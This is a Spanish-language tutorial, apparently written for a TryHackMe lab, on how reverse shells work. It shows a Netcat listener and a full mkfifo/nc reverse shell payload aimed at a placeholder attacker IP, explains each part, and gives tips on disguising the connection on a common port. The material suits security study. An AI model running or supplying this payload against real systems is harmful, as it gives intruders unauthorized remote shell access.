Una reverse shell es una de las técnicas más populares para ganar acceso a un sistema en ciberataques. Las conexiones inician desde el sistema objetivo, lo que ayuda a reducir la detección de firewalls y otras medidas de seguridad.

-------------------
<h2>¿Cómo funcionan las reverse shells?</h2>

------------------------
<h4>Configura un Listener Netcat (nc)</h2>
Entendamos ahora cómo funcionan las reverse shells en un escenario práctico usando Netcat. Esta herramienta soporta varios sistemas operativos y permite leer y escribir a través de una red.

Como ya hemos dicho, la conexión la comienza la máquina víctima, por lo que la máquina atacante estará esperando una conexión. Usaremos Netcat para escuchar. Usaremos el comando `nc -lvnp 443`.

```shell
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
```

El comando usa las opciones:

- `-l`: Indica a Netcat que escuche (listen) o espere por una conexión.
- `-v`: Activa verbose para ver más información.
- `-n`: Previene que las conexiones usen DNS lookup por lo que lo hará a partir de la IP.
- `-p`: Indica el puerto que utilizaremos, en nuestro caso el 443.

Puedes usar cualquier puerto para establecer la conexión pero los hackers suelen usar puertos conocidos utilizados por otras aplicaciones para enmascarar las conexiones.

-------------------------
<h4>Obteniendo una Reverse Shell</h4>
Una vez que tenemos nuestro listener configurado, el objetivo debe ejecutar lo que se conoce como payload de reverse shell. Normalmente este payload abusa una vulnerabilidad o un acceso no autorizado. Hay mucha variedad de payloads, que dependerán de las herramientas y el sistema operativo que sea atacado. Podemos ver algunos ejemplos [aquí](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Analicemos un payload de ejemplo:

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP_ATACANTE> <PUERTO_ATACANTE> >/tmp/f`

- `rm -f /tmp/f`: Elimina cualquier archivo pipe existente en `/tmp/f`. Esto es para crear una nueva pipe ahí sin conflictos.
- `mkfifo /tmp/f`: Crea una pipe o FIFO (First In First Out) en `/tmp/f`.
- `cat /tmp/f`: Lee la información de la pipe (espera input).
- `| bash -i 2>&1`: El output de cat se pipea a la instancia de shell (`bash -i`), que permite al atacante ejecutar comandos de manera interactiva. El `2>&1` redirecciona los errores al output (stderr a stdout), asegurándose de que cualquier error se manda de vuelta al atacante.
- `| nc IP_ATACANTE PUERTO ATACANTE`: Pipea el output de la shell hacia el atacante por medio de `nc` con la IP y el puerto.
- `>/tmp/f`: Esta parte manda el output de los comandos de vuelta hacia el pipe, permitiendo comunicación bidireccional.

>[!IMPORTANT] Esto es una "named pipe", no una pipe normal. Una normal no permite comunicación bidireccional con la misma.

----------------------------
<h4>El Atacante Recibe la Shell</h4>
Una vez que el payload es ejecutado, el atacante verá una reverse shell en su Netcat, permitiéndole ejecutar comandos en el sistema remoto.

```shell
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

